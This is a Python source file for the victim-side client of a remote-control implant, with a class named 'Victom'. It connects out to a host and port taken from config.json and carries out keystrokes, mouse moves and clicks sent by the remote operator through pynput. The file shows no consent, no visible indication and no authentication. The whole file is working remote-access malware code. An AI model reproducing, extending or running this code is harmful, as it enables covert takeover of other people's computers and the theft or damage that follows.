import json
import socket
from pathlib import Path
from pynput import mouse, keyboard
from pynput.keyboard import Controller as Controller_Keybooard
from pynput.mouse import Controller as Controller_mouse
import time


class Victom:
    def __init__(self):

        self.Control_kb = Controller_Keybooard()
        self.Control_m = Controller_mouse()
        self.Client: socket.socket = None

        config_path = Path(__file__).with_name('config.json')
        with config_path.open('r', encoding='utf-8') as f:
            config = json.load(f)

        HOST = config['HOST']
        PORT = config['PORT']

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.Client:
            self.Client.connect((HOST, PORT))

            while True:
                try:
                    Mod_size = int.from_bytes(self.recv_exact(2), "big") # Size Of Data Control
                    Mod = self.recv_exact(Mod_size).decode() # Control
                    data_size = int.from_bytes(self.recv_exact(2), "big") # Size Of Data Control
                    Control = self.recv_exact(data_size).decode() # Control
                except ConnectionError:
                    break

                if (Mod == "kb"):
                    if Control.startswith("Key."):
                        key_name = Control[4:]
                        key = getattr(keyboard.Key, key_name)
                    else:
                        key = Control

                    self.Control_kb.press(key)
                    time.sleep(0.03)
                    self.Control_kb.release(key)
                elif (Mod == "pos"):
                    x, y = Control.split("|")
                    x = int(x)
                    y = int(y)
                    self.Control_m.position = (x, y)
                elif (Mod == "click"):
                    Button_name = Control[8:]
                    Button = getattr(mouse.Button, Button_name)
                    self.Control_m.click(Button)

                

    def recv_exact(self, size):
        data_record = b""
        data = data_record

        while len(data_record) < size:
            data = self.Client.recv(size - len(data_record))

            if not data:
                raise ConnectionError("Connection closed before receiving all data")

            data_record += data

        return data_record


if __name__ == "__main__":
    V = Victom()